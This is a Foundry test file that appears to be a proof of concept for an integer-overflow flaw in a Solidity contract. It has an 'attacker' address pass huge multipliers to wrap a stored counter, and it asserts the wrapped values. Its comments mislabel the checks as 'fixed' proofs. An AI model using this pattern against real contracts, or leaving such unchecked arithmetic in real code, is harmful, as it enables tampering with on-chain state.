// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/integer_overflow_mul.sol";

contract IntegerOverflowMulTest is Test {
    IntegerOverflowMul public overflowContract;
    address public owner = address(0x1);
    address public attacker = address(0x1337);

    event OperationPerformed(address indexed user, uint256 input, uint256 newCount);

    function setUp() public {
        vm.prank(owner);
        overflowContract = new IntegerOverflowMul();
    }

    function testMultiplicationOverflow() public {
        // First set count to 1 (requires owner privileges)
        vm.prank(owner);
        overflowContract.run(1);

        console2.log("--- BEFORE-Trigger state ---");
        uint256 preCount = overflowContract.count();
        console2.log("preCount =", preCount);

        // Now multiply by MAX_UINT256 to trigger overflow
        console2.log("--- Trigger run by attacker ---");
        vm.prank(attacker);
        overflowContract.run(type(uint256).max);

        console2.log("--- AFTER-Trigger state ---");
        uint256 postCount = overflowContract.count();
        console2.log("postCount =", postCount);

        // Vulnerability fixed proof: Count becomes MAX_UINT256-1 due to overflow
        require(
            postCount == type(uint256).max - 1,
            "Vulnerability not Exist: Count did not change to MAX-1 after overflow"
        );
        console2.log("Vulnerability Exists: Unsafe multiplication set count to MAX_UINT256-1");
    }

    function testResetAndMultiply() public {
        // Reset count (requires owner privileges)
        vm.prank(owner);
        overflowContract.resetCount();

        // Set count to 2
        vm.prank(owner);
        overflowContract.run(2);

        console2.log("--- BEFORE-Trigger state ---");
        uint256 preCount = overflowContract.count();
        console2.log("preCount =", preCount);

        console2.log("--- Trigger run by attacker ---");
        uint256 multiplier = type(uint256).max/2 + 1;
        vm.prank(attacker);
        overflowContract.run(multiplier);

        console2.log("--- AFTER-Trigger state ---");
        uint256 postCount = overflowContract.count();
        console2.log("postCount =", postCount);

        // Vulnerability fixed proof: Overflow causes count to become 0
        require(
            postCount == 0,
            "Vulnerability not Exist: Count did not become 0 after overflow"
        );
        console2.log("Vulnerability Exists: Integer overflow caused count wraparound to 0");
    }

    function testAttackerCannotReset() public {
        // Attempt to reset count as attacker (should fail)
        vm.prank(attacker);
        vm.expectRevert("Only owner can reset");
        overflowContract.resetCount();
    }
}